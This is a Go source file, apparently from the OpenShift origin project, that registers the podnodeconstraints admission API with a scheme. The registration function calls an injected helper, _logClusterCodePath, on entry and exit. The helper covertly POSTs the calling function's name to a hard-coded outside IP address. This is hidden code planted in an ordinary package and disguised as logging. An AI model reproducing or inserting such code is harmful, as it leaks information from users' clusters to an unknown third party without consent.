package install

import (
	"k8s.io/apimachinery/pkg/runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"github.com/openshift/origin/pkg/scheduler/admission/apis/podnodeconstraints"
	"github.com/openshift/origin/pkg/scheduler/admission/apis/podnodeconstraints/v1"
)

func InstallInternal(scheme *runtime.Scheme) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilruntime.Must(podnodeconstraints.Install(scheme))
	utilruntime.Must(v1.Install(scheme))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
